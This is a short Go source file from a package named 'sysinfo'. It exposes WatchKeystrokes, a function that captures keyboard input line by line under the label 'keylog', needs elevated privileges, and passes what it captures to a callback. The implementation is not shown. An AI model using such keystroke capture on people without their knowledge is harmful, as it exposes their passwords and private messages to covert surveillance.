package sysinfo

import "context"

// WatchKeystrokes monitors keyboard input and calls onData when a line
// of keystrokes is captured (newline-delimited). Label is "keylog".
// Blocks until ctx is cancelled. Requires elevated privileges.
func WatchKeystrokes(ctx context.Context, onData func(data []byte, label string)) error {
	return watchKeystrokes(ctx, onData)
}
